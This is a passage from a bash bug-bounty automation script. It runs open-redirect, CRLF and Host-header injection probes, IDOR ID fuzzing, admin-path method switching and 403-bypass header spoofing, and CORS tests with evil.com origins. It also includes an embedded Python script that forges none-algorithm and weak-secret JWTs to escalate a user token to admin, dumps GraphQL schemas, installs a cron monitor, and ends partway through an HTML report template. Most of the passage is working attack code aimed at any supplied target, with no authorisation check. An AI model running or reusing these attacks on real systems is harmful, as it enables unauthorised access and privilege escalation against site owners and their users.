  if [[ -s "$REDIR_CANDIDATES" ]] && command -v qsreplace &>/dev/null; then
    while IFS= read -r url; do
      for payload in "${REDIR_PAYLOADS[@]}"; do
        local LOC
        LOC=$(echo "$url" | qsreplace "$payload" 2>/dev/null | \
          httpx -silent -follow-redirects=false \
          -match-header "location:.*evil" -threads 10 2>/dev/null) || true
        if [[ -n "$LOC" ]]; then
          echo "URL     : $url"     >> "$P/redirect/confirmed.txt"
          echo "PAYLOAD : $payload" >> "$P/redirect/confirmed.txt"
          echo "────────────────"   >> "$P/redirect/confirmed.txt"
          REDIR_COUNT=$((REDIR_COUNT+1))
          notify "MEDIUM" "Open Redirect: $url → $payload"
          break
        fi
      done
    done < <(head -200 "$REDIR_CANDIDATES")
  fi

  # ── 3.6 Host Header Injection ────────────────────────────────────
  if [[ -n "$COLLAB_SERVER" ]]; then
    log INFO "Host header injection (OOB) — check $COLLAB_SERVER..."
    head -50 "$P/urls/all_params.txt" | \
      httpx -silent \
            -H "Host: $COLLAB_SERVER" \
            -H "X-Forwarded-For: $COLLAB_SERVER" \
            -H "X-Forwarded-Host: $COLLAB_SERVER" \
            -H "X-Host: $COLLAB_SERVER" \
            -H "True-Client-IP: $COLLAB_SERVER" \
            -threads 10 > /dev/null 2>&1 || true
  fi

  # ── 3.7 CRLF Injection ───────────────────────────────────────────
  log INFO "CRLF injection testing..."
  local CRLF_PAYLOADS=(
    "%0d%0aSet-Cookie:crlf=injected"
    "%0aSet-Cookie:crlf=injected"
    "%E5%98%8D%E5%98%8ASet-Cookie:crlf=injected"
  )
  for payload in "${CRLF_PAYLOADS[@]}"; do
    command -v qsreplace &>/dev/null && \
    head -200 "$P/urls/all_params.txt" | qsreplace "$payload" 2>/dev/null | \
      httpx -silent -match-header "set-cookie:.*crlf" \
            -threads "$THREADS" >> "$P/other/crlf.txt" 2>/dev/null || true
  done

  # ── Save stats ────────────────────────────────────────────────────
  echo "XSS_COUNT=${XSS_COUNT}"     >> "$OUTPUT_DIR/stats.env"
  echo "SQLI_COUNT=${SQLI_COUNT}"   >> "$OUTPUT_DIR/stats.env"
  echo "SSTI_COUNT=${SSTI_COUNT}"   >> "$OUTPUT_DIR/stats.env"
  echo "REDIR_COUNT=${REDIR_COUNT}" >> "$OUTPUT_DIR/stats.env"
  log SUCCESS "Phase 3 complete — XSS:$XSS_COUNT | SQLi:$SQLI_COUNT | SSTI:$SSTI_COUNT | Redirect:$REDIR_COUNT ✓"
}

# ═══════════════════════════════════════════════════════════════════════════
# PHASE 4 — BROKEN ACCESS CONTROL FINDER
# ═══════════════════════════════════════════════════════════════════════════
phase_bac_finder() {
  log STAGE "══════════════════════════════════════════════════════"
  log STAGE " PHASE 4/5 — BROKEN ACCESS CONTROL (BAC / IDOR)"
  log STAGE "══════════════════════════════════════════════════════"

  local B="$OUTPUT_DIR/04_bac_finder"
  mkdir -p "$B"/{idor,cors,methods,jwt,graphql,403bypass}

  local BASE="https://$TARGET"
  local AUTH_HDR=""
  [[ -n "$USER_TOKEN" ]] && AUTH_HDR="Authorization: Bearer $USER_TOKEN"

  # ── 4.1 IDOR Numeric Fuzzing ─────────────────────────────────────
  log INFO "IDOR numeric fuzzing (IDs 1–300 on common endpoints)..."
  local API_TMPL=(
    "/api/v1/users/ID"       "/api/v1/orders/ID"
    "/api/v1/invoices/ID"    "/api/v1/documents/ID"
    "/api/v1/accounts/ID"    "/api/v2/users/ID"
    "/api/users/ID/profile"  "/api/users/ID"
    "/user/ID"               "/profile/ID"
    "/account/ID"            "/api/v1/tickets/ID"
  )
  local IDOR_COUNT=0
  for tmpl in "${API_TMPL[@]}"; do
    local DONE=0
    for id in $(seq 1 300); do
      DONE=$((DONE+1))
      progress_bar "IDOR fuzzing $tmpl" "$DONE" 300
      local URL="${BASE}${tmpl/ID/$id}"
      local STATUS
      STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
        ${AUTH_HDR:+-H "$AUTH_HDR"} --max-time 3 "$URL" 2>/dev/null) || continue
      if [[ "$STATUS" =~ ^(200|201|206)$ ]]; then
        echo "[IDOR:$STATUS] $URL" >> "$B/idor/numeric.txt"
        IDOR_COUNT=$((IDOR_COUNT+1))
        notify "HIGH" "IDOR Found [$STATUS]: $URL"
      fi
    done
    echo ""
  done

  # ── 4.2 HTTP Method Switching ─────────────────────────────────────
  log INFO "HTTP method switching on admin/sensitive endpoints..."
  local ADMIN_PATHS=(
    "/api/admin"           "/api/admin/users"       "/api/admin/settings"
    "/admin"               "/admin/users"           "/api/v1/admin"
    "/api/internal"        "/manage"                "/dashboard/admin"
    "/api/v1/users"        "/api/v1/config"         "/api/v1/debug"
    "/console"             "/actuator"              "/actuator/env"
    "/actuator/health"     "/.env"                  "/config"
    "/api/v2/admin"        "/api/system"
  )
  local METHODS=("GET" "POST" "PUT" "PATCH" "DELETE" "OPTIONS" "HEAD" "TRACE")
  local METHOD_COUNT=0
  for path in "${ADMIN_PATHS[@]}"; do
    for method in "${METHODS[@]}"; do
      local STATUS
      STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
        -X "$method" \
        ${AUTH_HDR:+-H "$AUTH_HDR"} \
        --max-time 3 "${BASE}${path}" 2>/dev/null) || continue
      if [[ "$STATUS" != "403" && "$STATUS" != "404" && \
            "$STATUS" != "000" && "$STATUS" != "400" ]]; then
        echo "[$method:$STATUS] $path" >> "$B/methods/bypass.txt"
        if [[ "$STATUS" =~ ^(200|201)$ ]]; then
          METHOD_COUNT=$((METHOD_COUNT+1))
          notify "CRITICAL" "Admin accessible! $method ${BASE}${path} → $STATUS"
        fi
      fi
    done
  done

  # ── 4.3 403 Bypass Techniques ─────────────────────────────────────
  log INFO "403 bypass technique testing..."
  local BYPASS_HEADERS=(
    "X-Original-URL"
    "X-Rewrite-URL"
    "X-Custom-IP-Authorization"
    "X-Forwarded-For"
    "X-ProxyUser-Ip"
    "X-Remote-IP"
    "X-Client-IP"
  )
  for path in "${ADMIN_PATHS[@]}"; do
    local STATUS
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
      --max-time 3 "${BASE}${path}" 2>/dev/null) || continue
    if [[ "$STATUS" == "403" ]]; then
      for hdr in "${BYPASS_HEADERS[@]}"; do
        local BYPASS_STATUS
        BYPASS_STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
          -H "${hdr}: 127.0.0.1" \
          -H "${hdr}: localhost" \
          --max-time 3 "${BASE}${path}" 2>/dev/null) || continue
        if [[ "$BYPASS_STATUS" == "200" ]]; then
          echo "[403-BYPASS via $hdr] $path" >> "$B/403bypass/found.txt"
          notify "HIGH" "403 Bypass! Header:$hdr Path:$path"
        fi
      done
      # Path-based bypass
      for variant in "/$path/" "/%2e$path" "$path%20" "$path#" "/$path..;/"; do
        local VARIANT_STATUS
        VARIANT_STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
          --max-time 3 "${BASE}${variant}" 2>/dev/null) || continue
        [[ "$VARIANT_STATUS" == "200" ]] && \
          echo "[PATH-BYPASS] $variant → 200" >> "$B/403bypass/found.txt"
      done
    fi
  done

  # ── 4.4 CORS Misconfiguration ──────────────────────────────────────
  log INFO "CORS misconfiguration testing..."
  local CORS_ORIGINS=(
    "https://evil.com"
    "https://${TARGET}.evil.com"
    "https://evil${TARGET}"
    "null"
    "https://not${TARGET}"
  )
  local API_EPS=("/api/v1/user" "/api/v1/profile" "/api/me" "/api/account" "/api/v1/account")
  local CORS_COUNT=0
  for origin in "${CORS_ORIGINS[@]}"; do
    for ep in "${API_EPS[@]}"; do
      local CORS_HDR
      CORS_HDR=$(curl -sk -I --max-time 5 \
        -H "Origin: $origin" \
        ${AUTH_HDR:+-H "$AUTH_HDR"} \
        "${BASE}${ep}" 2>/dev/null | \
        grep -i "access-control-allow-origin") || true
      if echo "$CORS_HDR" | grep -qE "${origin}|\*"; then
        local CRED_HDR
        CRED_HDR=$(curl -sk -I --max-time 5 \
          -H "Origin: $origin" "${BASE}${ep}" 2>/dev/null | \
          grep -i "access-control-allow-credentials") || true
        {
          echo "ORIGIN : $origin"
          echo "PATH   : $ep"
          echo "HEADER : $CORS_HDR"
          [[ -n "$CRED_HDR" ]] && echo "CREDS  : $CRED_HDR (⚠️ credentials=true → CRITICAL)"
          echo "────────────────"
        } >> "$B/cors/misconfig.txt"
        CORS_COUNT=$((CORS_COUNT+1))
        notify "HIGH" "CORS Misconfiguration: Origin $origin accepted on $ep"
      fi
    done
  done

  # ── 4.5 JWT Manipulation ───────────────────────────────────────────
  local JWT_COUNT=0
  if [[ -n "$USER_TOKEN" ]]; then
    log INFO "JWT — none-algorithm + role escalation attack..."
    python3 - "$USER_TOKEN" "$BASE" << 'PYEOF' >> "$B/jwt/results.txt" 2>/dev/null
import sys, json, base64, urllib.request, urllib.error

token, base_url = sys.argv[1], sys.argv[2]
parts = token.split('.')
if len(parts) != 3:
    print("[!] Not a valid JWT"); sys.exit()

def b64d(s):
    s += '=' * (4 - len(s) % 4)
    return base64.b64decode(s)

def b64e(d):
    return base64.b64encode(d).decode().rstrip('=')

try:
    payload = json.loads(b64d(parts[1]))
    print(f"[*] Original JWT payload:\n{json.dumps(payload, indent=2)}\n")
except Exception as e:
    print(f"[!] Decode error: {e}"); sys.exit()

# Build admin payload
payload_admin = dict(payload)
role_keys = ['role','userRole','user_role','userType','user_type','type','group','scope']
bool_keys = ['is_admin','isAdmin','admin','is_superuser','superuser']
for k in role_keys:
    if k in payload_admin:
        payload_admin[k] = 'admin'
for k in bool_keys:
    if k in payload_admin:
        payload_admin[k] = True

# Test 1: None algorithm
hdr_none = b64e(json.dumps({"alg":"none","typ":"JWT"}).encode())
pay_enc  = b64e(json.dumps(payload_admin).encode())
none_token = f"{hdr_none}.{pay_enc}."

for ep in ['/api/admin/users', '/api/admin', '/admin/api/users', '/api/v1/admin']:
    req = urllib.request.Request(
        f"{base_url}{ep}",
        headers={"Authorization": f"Bearer {none_token}"}
    )
    try:
        res = urllib.request.urlopen(req, timeout=5)
        print(f"[CRITICAL] JWT none-alg WORKS on {ep}! Status: {res.status}")
    except urllib.error.HTTPError as e:
        print(f"[*] {ep} → {e.code}")
    except Exception as e:
        print(f"[*] {ep} → {type(e).__name__}")

# Test 2: alg:HS256 with empty secret
import hmac, hashlib
hdr_hs = b64e(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
signing_input = f"{hdr_hs}.{pay_enc}".encode()
for secret in [b'', b'secret', b'password', b'key', b'your-256-bit-secret']:
    sig = b64e(hmac.new(secret, signing_input, hashlib.sha256).digest())
    weak_token = f"{hdr_hs}.{pay_enc}.{sig}"
    req2 = urllib.request.Request(
        f"{base_url}/api/admin/users",
        headers={"Authorization": f"Bearer {weak_token}"}
    )
    try:
        res2 = urllib.request.urlopen(req2, timeout=5)
        print(f"[CRITICAL] Weak JWT secret '{secret.decode()}' works!")
    except: pass
PYEOF
    JWT_COUNT=$(grep -c "CRITICAL" "$B/jwt/results.txt" 2>/dev/null || echo 0)
    [[ $JWT_COUNT -gt 0 ]] && notify "CRITICAL" "JWT vulnerability confirmed on $TARGET!"
  fi

  # ── 4.6 GraphQL Introspection + Mass Assignment ─────────────────
  log INFO "GraphQL introspection + mass assignment check..."
  local GQL_EPS=("/graphql" "/api/graphql" "/v1/graphql" "/query" "/gql" "/api/v1/graphql")
  local GQL_COUNT=0
  for ep in "${GQL_EPS[@]}"; do
    local GQL_RES
    GQL_RES=$(curl -sk --max-time 5 \
      -X POST -H "Content-Type: application/json" \
      ${AUTH_HDR:+-H "$AUTH_HDR"} \
      -d '{"query":"{__schema{types{name}}}"}' \
      "${BASE}${ep}" 2>/dev/null) || continue
    if echo "$GQL_RES" | grep -q "__schema"; then
      echo "[INTROSPECTION ENABLED] ${BASE}${ep}" >> "$B/graphql/findings.txt"
      GQL_COUNT=$((GQL_COUNT+1))
      # Extract all queries + mutations
      curl -sk --max-time 8 \
        -X POST -H "Content-Type: application/json" \
        ${AUTH_HDR:+-H "$AUTH_HDR"} \
        -d '{"query":"{__schema{queryType{fields{name description}}mutationType{fields{name description}}}}"}' \
        "${BASE}${ep}" 2>/dev/null | python3 -c "
import json,sys
try:
  d=json.load(sys.stdin)
  schema=d['data']['__schema']
  print('=== QUERIES ===')
  for f in (schema.get('queryType') or {}).get('fields',[]):
    print(f'  {f[\"name\"]} — {f.get(\"description\",\"\")}')
  print('=== MUTATIONS ===')
  for f in (schema.get('mutationType') or {}).get('fields',[]):
    print(f'  {f[\"name\"]} — {f.get(\"description\",\"\")}')
except Exception as e: print(f'parse error: {e}')
" >> "$B/graphql/schema.txt" 2>/dev/null || true
      notify "MEDIUM" "GraphQL introspection ENABLED: ${BASE}${ep}"
    fi
  done

  # ── Save stats ────────────────────────────────────────────────────
  echo "IDOR_COUNT=${IDOR_COUNT}"     >> "$OUTPUT_DIR/stats.env"
  echo "METHOD_COUNT=${METHOD_COUNT}" >> "$OUTPUT_DIR/stats.env"
  echo "CORS_COUNT=${CORS_COUNT}"     >> "$OUTPUT_DIR/stats.env"
  echo "JWT_COUNT=${JWT_COUNT}"       >> "$OUTPUT_DIR/stats.env"
  echo "GQL_COUNT=${GQL_COUNT}"       >> "$OUTPUT_DIR/stats.env"
  log SUCCESS "Phase 4 complete — IDOR:$IDOR_COUNT | CORS:$CORS_COUNT | Method-Bypass:$METHOD_COUNT | JWT:$JWT_COUNT ✓"
}

# ═══════════════════════════════════════════════════════════════════════════
# PHASE 5 — CONTINUOUS MONITORING SETUP
# ═══════════════════════════════════════════════════════════════════════════
phase_monitor_setup() {
  log STAGE "══════════════════════════════════════════════════════"
  log STAGE " PHASE 5/5 — CONTINUOUS MONITORING SETUP"
  log STAGE "══════════════════════════════════════════════════════"

  local MON_DIR="$HOME/.bug_monitor/$TARGET"
  mkdir -p "$MON_DIR"/{hashes,baseline}

  # ── 5.1 Snapshot current state ────────────────────────────────────
  if [[ -f "$OUTPUT_DIR/01_recon/all_subs.txt" ]]; then
    cp "$OUTPUT_DIR/01_recon/all_subs.txt"        "$MON_DIR/baseline/subs.txt"
    awk '{print $1}' "$OUTPUT_DIR/01_recon/live/live_hosts.txt" 2>/dev/null | \
      sort -u > "$MON_DIR/baseline/live_hosts.txt" || true
    log SUCCESS "Baseline snapshot saved: $(wc -l < "$MON_DIR/baseline/subs.txt") subs"
  else
    # If only monitor mode, generate fresh baseline
    log INFO "Generating fresh baseline for $TARGET..."
    subfinder -d "$TARGET" -silent 2>/dev/null | sort -u > "$MON_DIR/baseline/subs.txt"
    httpx -l "$MON_DIR/baseline/subs.txt" -silent -threads 50 2>/dev/null | \
      awk '{print $1}' | sort -u > "$MON_DIR/baseline/live_hosts.txt" || true
  fi

  # ── 5.2 Content hash baseline for live hosts ─────────────────────
  log INFO "Building content hash baseline (top 50 live hosts)..."
  head -50 "$MON_DIR/baseline/live_hosts.txt" | while IFS= read -r host; do
    local HASH
    HASH=$(curl -sk --max-time 8 "$host" 2>/dev/null | md5sum | awk '{print $1}') || continue
    local KEY
    KEY=$(echo "$host" | md5sum | awk '{print $1}')
    echo "$HASH" > "$MON_DIR/hashes/${KEY}.hash"
  done
  log SUCCESS "Content hashes baseline ready"

  # ── 5.3 Generate self-contained monitor script ────────────────────
  local MONITOR_SCRIPT="$MON_DIR/monitor.sh"
  cat > "$MONITOR_SCRIPT" << MONITOR_EOF
#!/bin/bash
# Auto-generated by Bug Hunter Pipeline v2.0
# Target  : $TARGET
# Created : $(date)
# Cron    : */30 * * * *

TARGET="$TARGET"
MON_DIR="$MON_DIR"
TG_TOKEN="$TELEGRAM_TOKEN"
TG_CHAT="$TELEGRAM_CHAT_ID"
SLACK_WH="$SLACK_WEBHOOK"
THREADS=30

_notify() {
  local SEV=\$1 MSG=\$2
  echo "[\$(date '+%Y-%m-%d %H:%M')] [\$SEV] \$MSG" >> "\$MON_DIR/alerts.log"
  [[ -n "\$TG_TOKEN" ]] && curl -s "https://api.telegram.org/bot\${TG_TOKEN}/sendMessage" \\
    --data-urlencode "chat_id=\${TG_CHAT}" \\
    --data-urlencode "text=[\$SEV] \$MSG" > /dev/null 2>&1 || true
  [[ -n "\$SLACK_WH" ]] && curl -s -X POST "\$SLACK_WH" \\
    -H 'Content-type: application/json' \\
    -d "{\"text\":\"[\$SEV] \$MSG\"}" > /dev/null 2>&1 || true
}

# ── A. New Subdomains ─────────────────────────────────────────────
subfinder -d "\$TARGET" -silent 2>/dev/null | sort -u > /tmp/mon_curr_subs.txt
if [[ -f "\$MON_DIR/baseline/subs.txt" ]]; then
  NEW_SUBS=\$(comm -13 "\$MON_DIR/baseline/subs.txt" /tmp/mon_curr_subs.txt 2>/dev/null)
  while IFS= read -r sub; do
    [[ -z "\$sub" ]] && continue
    STATUS=\$(httpx -u "\$sub" -silent -status-code 2>/dev/null | awk '{print \$2}')
    if echo "\$STATUS" | grep -qE "200|301|302|403"; then
      _notify "HIGH" "🆕 NEW LIVE subdomain: \$sub [\$STATUS] on \$TARGET — HUNT NOW!"
    else
      _notify "INFO" "New subdomain (offline): \$sub on \$TARGET"
    fi
  done <<< "\$NEW_SUBS"
fi
cp /tmp/mon_curr_subs.txt "\$MON_DIR/baseline/subs.txt"

# ── B. Content Changes ────────────────────────────────────────────
while IFS= read -r host; do
  CURR=\$(curl -sk --max-time 8 "\$host" 2>/dev/null | md5sum | awk '{print \$1}') || continue
  KEY=\$(echo "\$host" | md5sum | awk '{print \$1}')
  HASH_FILE="\$MON_DIR/hashes/\${KEY}.hash"
  if [[ -f "\$HASH_FILE" ]]; then
    OLD=\$(cat "\$HASH_FILE")
    [[ "\$CURR" != "\$OLD" ]] && \
      _notify "MEDIUM" "⚠️ Content changed on \$host — new attack surface possible!"
  fi
  echo "\$CURR" > "\$HASH_FILE"
done < <(head -50 "\$MON_DIR/baseline/live_hosts.txt" 2>/dev/null)

# ── C. New JS Files ───────────────────────────────────────────────
echo "https://\$TARGET" | gau --blacklist css,png,jpg,svg 2>/dev/null | \\
  grep "\.js" | sort -u > /tmp/mon_curr_js.txt
if [[ -f "\$MON_DIR/baseline/js_files.txt" ]]; then
  NEW_JS=\$(comm -13 "\$MON_DIR/baseline/js_files.txt" /tmp/mon_curr_js.txt 2>/dev/null)
  while IFS= read -r js; do
    [[ -z "\$js" ]] && continue
    _notify "HIGH" "🆕 New JS file deployed: \$js — check for secrets immediately!"
  done <<< "\$NEW_JS"
fi
cp /tmp/mon_curr_js.txt "\$MON_DIR/baseline/js_files.txt"

# ── D. Status Code Change ─────────────────────────────────────────
while IFS= read -r host; do
  NEW_STATUS=\$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "\$host" 2>/dev/null) || continue
  STATUS_FILE="\$MON_DIR/hashes/status_\$(echo \$host | md5sum | awk '{print \$1}').txt"
  if [[ -f "\$STATUS_FILE" ]]; then
    OLD_STATUS=\$(cat "\$STATUS_FILE")
    if [[ "\$NEW_STATUS" != "\$OLD_STATUS" ]]; then
      if [[ "\$OLD_STATUS" == "403" && "\$NEW_STATUS" == "200" ]]; then
        _notify "CRITICAL" "🚨 403→200 on \$host — Previously blocked, now OPEN!"
      else
        _notify "INFO" "Status changed: \$host \$OLD_STATUS → \$NEW_STATUS"
      fi
    fi
  fi
  echo "\$NEW_STATUS" > "\$STATUS_FILE"
done < <(head -100 "\$MON_DIR/baseline/live_hosts.txt" 2>/dev/null)

echo "[\$(date '+%Y-%m-%d %H:%M')] Monitor cycle complete" >> "\$MON_DIR/monitor.log"
MONITOR_EOF

  chmod +x "$MONITOR_SCRIPT"

  # ── 5.4 Install cron ──────────────────────────────────────────────
  local CRON_ENTRY="*/30 * * * * $MONITOR_SCRIPT >> $MON_DIR/cron.log 2>&1"
  ( crontab -l 2>/dev/null | grep -v "bug_monitor/$TARGET"; \
    echo "$CRON_ENTRY" ) | crontab - 2>/dev/null || \
    log WARN "Cron install failed — add manually: $CRON_ENTRY"

  log SUCCESS "Monitor setup complete"
  log INFO    "Script  : $MONITOR_SCRIPT"
  log INFO    "Alerts  : $MON_DIR/alerts.log"
  log INFO    "Cron    : every 30 minutes (auto-installed)"
}

# ═══════════════════════════════════════════════════════════════════════════
# PHASE 6 — HTML REPORT GENERATION
# ═══════════════════════════════════════════════════════════════════════════
phase_report() {
  log STAGE "══════════════════════════════════════════════════════"
  log STAGE " PHASE 6/6 — GENERATING HTML REPORT"
  log STAGE "══════════════════════════════════════════════════════"

  source "$OUTPUT_DIR/stats.env" 2>/dev/null || true

  local TOTAL_FINDINGS=$(( \
    ${SECRETS_COUNT:-0} + ${XSS_COUNT:-0}    + ${SQLI_COUNT:-0} + \
    ${SSTI_COUNT:-0}    + ${IDOR_COUNT:-0}   + ${CORS_COUNT:-0} + \
    ${MAP_COUNT:-0}     + ${JWT_COUNT:-0}    + ${GQL_COUNT:-0}  ))

  local ELAPSED=$(( SECONDS - START_TIME ))
  local REPORT="$OUTPUT_DIR/report_${TARGET}_${TIMESTAMP}.html"

  # Collect file content for report
  local SCORED_TARGETS  JS_SECRETS  SOURCEMAPS
  local XSS_HITS        SQLI_HITS   SSTI_HITS   REDIR_HITS
  local IDOR_HITS       CORS_HITS   METHOD_HITS JWT_HITS
  SCORED_TARGETS=$(head -25 "$OUTPUT_DIR/01_recon/live/scored_targets.txt" 2>/dev/null || echo "N/A")
  JS_SECRETS=$(head -60 "$OUTPUT_DIR/02_js_hunter/secrets/raw_secrets.txt" 2>/dev/null || echo "No secrets found")
  SOURCEMAPS=$(cat "$OUTPUT_DIR/02_js_hunter/sourcemaps/found.txt" 2>/dev/null || echo "None")
  XSS_HITS=$(cat "$OUTPUT_DIR/03_param_hunter/xss/confirmed.txt" 2>/dev/null || echo "None confirmed")
  SQLI_HITS=$(cat "$OUTPUT_DIR/03_param_hunter/sqli/error_based.txt" 2>/dev/null || echo "None")
  SSTI_HITS=$(cat "$OUTPUT_DIR/03_param_hunter/ssti/confirmed.txt" 2>/dev/null || echo "None")
  REDIR_HITS=$(cat "$OUTPUT_DIR/03_param_hunter/redirect/confirmed.txt" 2>/dev/null || echo "None")
  IDOR_HITS=$(head -30 "$OUTPUT_DIR/04_bac_finder/idor/numeric.txt" 2>/dev/null || echo "None")
  CORS_HITS=$(cat "$OUTPUT_DIR/04_bac_finder/cors/misconfig.txt" 2>/dev/null || echo "None")
  METHOD_HITS=$(grep "200\|201" "$OUTPUT_DIR/04_bac_finder/methods/bypass.txt" 2>/dev/null || echo "None")
  JWT_HITS=$(grep "CRITICAL" "$OUTPUT_DIR/04_bac_finder/jwt/results.txt" 2>/dev/null || echo "None")

  cat > "$REPORT" << HTMLEOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Bug Hunt Report — ${TARGET}</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Syne:wght@400;700;800&display=swap');
  :root {
    --bg:     #060b14;
    --surf:   #0d1520;
    --card:   #111e2e;
    --bord:   #1a3050;
    --accent: #00d9ff;
    --acc2:   #7c3aed;
    --red:    #ff3b5c;
    --green:  #00e676;
    --yellow: #ffd600;
    --orange: #ff6d00;
    --text:   #cdd9f0;
    --muted:  #4a6080;
  }
  * { box-sizing:border-box; margin:0; padding:0; }
  body {
    font-family: 'JetBrains Mono', monospace;
    background: var(--bg);
    color: var(--text);
    min-height: 100vh;
    padding: 0;
  }
  /* ── Header ── */
  .header {
    background: linear-gradient(135deg, #060b14 0%, #0d1a30 50%, #060b14 100%);
    border-bottom: 1px solid var(--bord);
    padding: 2.5rem 3rem;
    position: relative;
    overflow: hidden;
  }
  .header::before {
    content: '';
    position: absolute; inset: 0;
    background: radial-gradient(ellipse at 20% 50%, rgba(0,217,255,.06) 0%, transparent 60%),
                radial-gradient(ellipse at 80% 50%, rgba(124,58,237,.05) 0%, transparent 60%);
    pointer-events: none;
  }
  .header h1 {
    font-family: 'Syne', sans-serif;
    font-size: 2.2rem;
    font-weight: 800;
    background: linear-gradient(90deg, var(--accent), var(--acc2));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    margin-bottom: .5rem;
  }
  .header-meta { color: var(--muted); font-size: .8rem; }
  .header-meta span { color: var(--accent); }
  /* ── Layout ── */
  .container { max-width: 1400px; margin: 0 auto; padding: 2rem 3rem; }
  /* ── Stats Grid ── */
  .stats-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
    gap: .8rem;
    margin: 1.5rem 0 2.5rem;
  }
  .stat-card {
    background: var(--card);
    border: 1px solid var(--bord);
    border-radius: 10px;
    padding: 1.2rem;
    text-align: center;
    position: relative;
    overflow: hidden;
    transition: transform .2s, border-color .2s;
  }
  .stat-card:hover { transform: translateY(-2px); border-color: var(--accent); }
  .stat-card::before {
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0;
    height: 2px;
  }
  .stat-card.blue::before   { background: var(--accent); }
  .stat-card.green::before  { background: var(--green);  }
  .stat-card.red::before    { background: var(--red);    }
  .stat-card.yellow::before { background: var(--yellow); }
  .stat-card.orange::before { background: var(--orange); }
  .stat-card.purple::before { background: var(--acc2);   }
  .stat-num {
    font-family: 'Syne', sans-serif;
    font-size: 2.4rem;
    font-weight: 800;
    line-height: 1;
    margin-bottom: .4rem;
  }
  .blue   .stat-num { color: var(--accent); }
  .green  .stat-num { color: var(--green);  }
  .red    .stat-num { color: var(--red);    }
  .yellow .stat-num { color: var(--yellow); }
  .orange .stat-num { color: var(--orange); }
  .purple .stat-num { color: var(--acc2);   }
  .stat-lbl { font-size: .65rem; color: var(--muted); text-transform: uppercase; letter-spacing: 1.5px; }
  /* ── Section ── */
  .section { margin-bottom: 2.5rem; }
  .section-header {
    display: flex;
    align-items: center;
    gap: .8rem;
    margin-bottom: 1rem;
    padding-bottom: .6rem;
    border-bottom: 1px solid var(--bord);
  }
  .section-header h2 {
    font-family: 'Syne', sans-serif;
    font-size: 1.1rem;
    font-weight: 700;
    color: var(--text);
  }
  .badge {
    display: inline-block;
    padding: .2rem .6rem;
    border-radius: 4px;
    font-size: .65rem;
    font-weight: 700;
    letter-spacing: .5px;
    text-transform: uppercase;
  }
  .b-crit   { background: var(--red);    color: #fff; }
  .b-high   { background: var(--orange); color: #fff; }
  .b-med    { background: var(--yellow); color: #000; }
  .b-info   { background: var(--accent); color: #000; }
  .b-ok     { background: var(--green);  color: #000; }
  /* ── Code blocks ── */
  pre {
    background: var(--surf);
    border: 1px solid var(--bord);
    border-left: 3px solid var(--bord);
    border-radius: 6px;
    padding: 1rem 1.2rem;
    font-size: .75rem;
    overflow-x: auto;
    white-space: pre-wrap;
    word-break: break-all;
    max-height: 350px;
    overflow-y: auto;
    line-height: 1.6;
    color: var(--text);
    margin-bottom: 1rem;
  }
  pre.has-findings { border-left-color: var(--red); }
  pre.no-findings  { border-left-color: var(--green); color: var(--muted); }
  /* ── Timeline ── */
  .timeline { display:flex; gap:0; flex-wrap:wrap; margin:1rem 0; }
  .tl-step {
    flex:1; min-width:130px;
    background: var(--card); border:1px solid var(--bord);
    padding:.8rem; text-align:center;
    position:relative;
  }
  .tl-step:not(:last-child)::after {
    content:'▶';
    position:absolute; right:-10px; top:50%; transform:translateY(-50%);
    color:var(--accent); font-size:.7rem; z-index:1;
  }
  .tl-step .tl-icon { font-size:1.4rem; }
  .tl-step .tl-name { font-size:.65rem; color:var(--muted); margin-top:.3rem; text-transform:uppercase; }
  /* ── Footer ── */
  footer {
    margin-top: 3rem;
    padding: 1.5rem 3rem;
    border-top: 1px solid var(--bord);
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: .7rem;
    color: var(--muted);
  }
</style>
</head>
<body>

<div class="header">
  <h1>🎯 Bug Hunt Report</h1>
  <div class="header-meta">
    Target: <span>${TARGET}</span> &nbsp;·&nbsp;
    Date: <span>$(date '+%Y-%m-%d %H:%M')</span> &nbsp;·&nbsp;
    Mode: <span>${MODE}</span> &nbsp;·&nbsp;
    Duration: <span>${ELAPSED}s</span> &nbsp;·&nbsp;
    Total findings: <span style="color:var(--red);font-weight:bold">${TOTAL_FINDINGS}</span>
  </div>
</div>

<div class="container">

  <!-- Pipeline flow -->
  <div class="timeline">
    <div class="tl-step"><div class="tl-icon">🔍</div><div class="tl-name">Recon</div></div>
    <div class="tl-step"><div class="tl-icon">🔑</div><div class="tl-name">JS Hunter</div></div>
    <div class="tl-step"><div class="tl-icon">💉</div><div class="tl-name">Param Probe</div></div>
    <div class="tl-step"><div class="tl-icon">🎯</div><div class="tl-name">BAC/IDOR</div></div>
    <div class="tl-step"><div class="tl-icon">📡</div><div class="tl-name">Monitor</div></div>
    <div class="tl-step"><div class="tl-icon">📄</div><div class="tl-name">Report</div></div>
  </div>

  <!-- Summary stats -->
  <div class="section">
    <div class="section-header"><h2>📊 Executive Summary</h2></div>
    <div class="stats-grid">
      <div class="stat-card blue">  <div class="stat-num">${TOTAL_SUBS:-0}</div>   <div class="stat-lbl">Subdomains</div></div>
      <div class="stat-card green"> <div class="stat-num">${TOTAL_LIVE:-0}</div>   <div class="stat-lbl">Live Hosts</div></div>
      <div class="stat-card red">   <div class="stat-num">${SECRETS_COUNT:-0}</div><div class="stat-lbl">Secrets</div></div>
      <div class="stat-card orange"><div class="stat-num">${MAP_COUNT:-0}</div>    <div class="stat-lbl">Source Maps</div></div>
      <div class="stat-card yellow"><div class="stat-num">${XSS_COUNT:-0}</div>   <div class="stat-lbl">XSS</div></div>
      <div class="stat-card red">   <div class="stat-num">${SQLI_COUNT:-0}</div>  <div class="stat-lbl">SQLi</div></div>
      <div class="stat-card red">   <div class="stat-num">${SSTI_COUNT:-0}</div>  <div class="stat-lbl">SSTI</div></div>
